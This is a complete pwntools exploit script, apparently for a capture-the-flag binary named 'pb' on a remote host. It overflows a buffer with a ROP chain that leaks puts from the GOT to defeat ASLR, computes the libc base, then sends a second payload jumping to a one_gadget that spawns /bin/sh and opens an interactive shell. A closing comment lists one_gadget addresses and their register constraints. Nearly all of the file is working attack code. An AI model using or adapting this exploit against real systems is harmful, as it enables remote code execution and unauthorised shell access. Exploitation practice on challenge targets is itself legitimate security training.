from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('./pb')
libc = ELF('./glibc/libc.so.6')

# p = process('./pb')
p = remote('159.65.86.238', '32051')
pause()

_start_addr = 0x004010d0
pop_rdi_ret = 0x000000000040142b
payload = flat(
    b'a' * 0x38,
    pop_rdi_ret,
    elf.got['puts'],
    elf.plt['puts'],
    _start_addr,
) 
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b': ', payload)

p.recvuntil(b'thank you!\n\n')
libc.address = u64(p.recv(6).ljust(8, b'\0')) - libc.sym['puts']
pop_rcx_ret = 0x000000000008c6bb + libc.address

payload = flat(
    b'a' * 0x30,
    0,
    pop_rcx_ret,
    0,
    libc.address + 0x50a37,
)
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b': ', payload)

p.interactive()

'''
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''